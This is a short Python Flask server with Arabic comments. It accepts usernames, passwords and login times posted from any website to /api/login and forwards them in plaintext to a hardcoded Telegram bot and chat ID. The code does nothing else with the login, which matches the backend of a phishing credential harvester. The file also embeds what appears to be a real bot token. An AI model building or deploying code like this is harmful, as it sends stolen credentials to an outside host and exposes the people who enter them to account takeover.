from flask import Flask, request, jsonify
from flask_cors import CORS
import os
import requests

app = Flask(__name__)
CORS(app)  # للسماح لموقعك بإرسال الطلبات للسيرفر

TELEGRAM_BOT_TOKEN = "8845863708:AAGw8ivjJk8iWzFf89HOT-OQSKrZmOL54Pc"
CHAT_ID = "7468044993"

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "HTML"
    }
    requests.post(url, json=payload)

@app.route('/api/login', methods=['POST'])
def handle_login():
    data = request.json
    username = data.get('username')
    password = data.get('password')
    last_login = data.get('last_login')
    
    msg = (
        f"🚨 <b>تسجيل دخول جديد لموقعك!</b>\n\n"
        f"👤 <b>اسم المستخدم:</b> {username}\n"
        f"🔑 <b>كلمة المرور:</b> {password}\n"
        f"🕒 <b>وقت الدخول:</b> {last_login}"
    )
    
    send_to_telegram(msg)
    return jsonify({"status": "success", "message": "تم إرسال البيانات بنجاح"})

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)